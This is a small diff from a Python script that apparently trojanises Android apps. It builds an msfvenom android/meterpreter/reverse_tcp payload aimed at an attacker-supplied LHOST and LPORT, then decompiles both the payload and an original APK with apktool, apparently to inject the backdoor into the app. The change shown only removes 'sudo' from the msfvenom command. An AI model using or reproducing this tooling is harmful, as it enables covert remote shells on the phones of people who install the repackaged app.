@@ -88,7 +88,7 @@ if sys.argv[1]==None or sys.argv[2]==None or sys.argv[3]==None:
 else:
 #bash commands
 	original_apk=sys.argv[1]
-	msfvenom_backdoor_payload="sudo msfvenom -p android/meterpreter/reverse_tcp  LHOST=" + \
+	msfvenom_backdoor_payload="msfvenom -p android/meterpreter/reverse_tcp  LHOST=" + \
 					sys.argv[2] +" LPORT=" + sys.argv[3]+ " R > 	andro.apk"
 	dissasemble_payload="apktool d -f -o payload andro.apk "
 	dissasemble_original="apktool d -f -o original " + original_apk 
